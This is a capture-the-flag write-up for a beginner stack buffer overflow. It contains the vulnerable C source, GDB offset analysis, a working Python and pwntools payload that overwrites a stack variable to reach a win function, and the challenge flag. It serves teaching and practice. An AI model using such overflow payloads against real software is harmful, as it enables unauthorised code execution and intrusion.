---
title: "Pwn - Baby Buffer Overflow"
description: "Exploiting a classic stack-based buffer overflow to overwrite a variable and unlock the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                |
|------------|----------------------|
| Category   | Binary Exploitation  |
| Difficulty | Easy                 |
| Points     | 150                  |
| Flag       | `zemi{buff3r_0v3rfl0w_g03s_brr}` |

## Challenge Files

Download the challenge files to get started:

- [overflow.c](/Website/challenges/pwn-buffer-overflow/overflow.c)
- [Makefile](/Website/challenges/pwn-buffer-overflow/Makefile)
- [flag.txt](/Website/challenges/pwn-buffer-overflow/flag.txt)

## Reconnaissance

We're given a binary `overflow` and its source code:

```c
#include <stdio.h>
#include <string.h>

void win() {
    FILE *f = fopen("flag.txt", "r");
    char flag[64];
    fgets(flag, 64, f);
    printf("%s\n", flag);
}

int main() {
    int check = 0;
    char buffer[64];

    printf("Enter your name: ");
    gets(buffer);

    if (check == 0xdeadbeef) {
        win();
    } else {
        printf("Hello, %s! (check = 0x%08x)\n", buffer, check);
    }
    return 0;
}
```

The vulnerability is obvious: `gets()` reads input with no bounds checking. The `buffer` is 64 bytes, but we can write past it. Since `check` is declared before `buffer` on the stack, we might be able to overwrite it.

## Stack Layout Analysis

Let's verify the layout with GDB. On x86-64 with most compilers, the stack grows downward. Variables declared first often sit at higher addresses. The layout looks like:

```
High addresses
+-----------------+
| check (4 bytes) |  <-- we need to overwrite this
+-----------------+
| buffer (64 bytes)|  <-- gets() writes here
+-----------------+
Low addresses (stack grows down)
```

So if we write more than 64 bytes into `buffer`, we overflow into `check`.

Let's confirm the exact offset:

```bash
gdb ./overflow
```

```gdb
(gdb) disas main
   ...
   0x40121a <+34>:  lea  rax,[rbp-0x50]    # buffer at rbp-0x50 (80)
   0x40121e <+38>:  ...
   0x401230 <+56>:  cmp  DWORD PTR [rbp-0x4], 0xdeadbeef  # check at rbp-0x4
   ...
```

- `buffer` starts at `rbp - 0x50` (offset 80 from rbp)
- `check` is at `rbp - 0x4` (offset 4 from rbp)
- Distance: `0x50 - 0x4 = 0x4C = 76 bytes`

We need to write 76 bytes of padding, then `0xdeadbeef` in little-endian.

## Exploitation

```python
import struct

# 76 bytes of padding + 0xdeadbeef in little-endian
payload = b"A" * 76
payload += struct.pack("<I", 0xdeadbeef)

with open("payload.bin", "wb") as f:
    f.write(payload)
```

Send it:

```bash
./overflow < payload.bin
```

```
Enter your name: zemi{buff3r_0v3rfl0w_g03s_brr}
```

The `win()` function executes and prints the flag.

## Debugging the Exploit

If the offset is wrong, you can use a cyclic pattern to find it:

```python
from pwn import *

# Generate a unique pattern
pattern = cyclic(100)
print(pattern)
```

Run the binary with the pattern, then check what value `check` holds:

```
Hello, aaaabaaacaaadaaa...! (check = 0x61616174)
```

```python
from pwn import *
offset = cyclic_find(0x61616174)
print(f"Offset: {offset}")  # Should print 76
```

## Full pwntools Solve Script

```python
from pwn import *

# Connect to remote or run locally
# p = remote("challenge.ctf.local", 1337)
p = process("./overflow")

payload = b"A" * 76
payload += p32(0xdeadbeef)

p.sendlineafter(b"name: ", payload)
print(p.recvall().decode())
```

## Tools Used

- GDB — determine stack layout and variable offsets
- Python `struct` — pack integers in little-endian format
- pwntools — CTF exploitation framework for Python

## Lessons Learned

- `gets()` is **never** safe — it was removed from the C11 standard for good reason
- Use `fgets()` with a size limit instead
- Stack variables can be overwritten if bounds are not checked
- Little-endian byte order means `0xdeadbeef` is stored as `\xef\xbe\xad\xde`
- Cyclic patterns (De Bruijn sequences) help find exact offsets without guessing
- Modern protections like stack canaries, ASLR, and NX mitigate these attacks — but CTFs often disable them
